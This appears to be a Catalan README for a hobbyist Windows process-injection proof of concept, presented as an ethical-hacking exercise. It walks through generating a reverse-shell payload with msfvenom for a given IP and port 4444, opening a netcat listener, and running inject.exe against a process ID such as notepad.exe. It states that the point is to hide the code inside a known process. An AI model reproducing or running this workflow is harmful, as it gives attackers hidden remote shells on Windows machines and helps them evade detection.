## Inject
Simple windows process code injection

## POC
El repte està en injectar un tros de codi executable dins un procés que ja es troba en execució. D'aquesta manera, el codi queda ocultat dins l'arbre de processos, com un fil d'execució dins un procés conegut, com per exemple, explorer.exe, notepad.exe, calc.exe, etc. 

## Descripció
En el repositori trobem una solució en c++ que mitjanant l' API de windows injecta codi en un procés que rep per la línia de comandes. El codi a injectar es troba en una variable **shellcode** en format de Bytecode. En l'exemple he utilitzat un petit codi que executa una shell inversa (reverse shell) de 6u bits (x64). Aquest codi, pot ser qualsevol cosa que se’ns passi pel cap. Però, ha de ser petit, quan més petit millor, ja que s'injecta en la memòria del procés. Podem trobar molt codi d'exemple per internet, un bon lloc és
https://www.exploit-db.com/shellcodes.

## Cas d'ús
El ByteCode (https://es.wikipedia.org/wiki/Bytecode) que utilitzat jo, no és funcional en qualsevol estació de treball, ja que està fet a mida perquè es connecti a un ordinador remot que jo he utilitzat.
Per fer la prova, calen dos ordinadors. Jo he utilitzat un Kali/linux per generar el ByteCode i per obrir un Netcat escoltat en un port (4444), on si tot va bé és connectarà el procés injectat.

Per generar el ByteCode he utilitzat una utilitat **msfvenom** del Framework Metasploit (https://www.metasploit.com/), instal.lat a Kali. Té moltes opcions, es digne d'estudi. Pot fer sortides de codi per diferents llenguatges i tecnologies. Pel cas que ens toca:
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP] LPORT=[port] -f c

Ex:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.28.123.152 LPORT=4444 -f c
```
La sortida la assignem a la variable **shellcode**. Tot seguit en un terminal de la Kali, engeguem el Netcat escoltant en el port triat.
```
nc -llvp 4444
```
Aquí, si tot va bé, és on ens trobarem una shell de windows de PC on hem injectat el codi.

Ara el en PC windows, on hi tenim el nostre programa **inject.exe**, engeguem per exemple el **notepad.exe**. Amb l'explorador de processos de windows, mirem el número de procés del **notepad.exe** (No tanquem l’arbre de processos, perquè això podem observar els fils d'execució que té). Tot seguit executem:
```
inject.exe [PID Notepad.exe]
Ex:
inject.exe 12345
```
Si tot ha anat bé, al Kali tenim una shell del windows amb els permisos d'usuari que té el procés del Notepad.exe a l'estació Windows. I a l'arbre de processos, un fil penjant del **Notepad**

A partir d'aquí imaginació (no vull donar idees). És un pas necessari si et vols iniciar en el Hacking Ètic.

**La cançó** (Sempre escolto música quan escric, programo, penso en solucions...)
https://www.youtube.com/watch?v=bwNzGT-UX7c



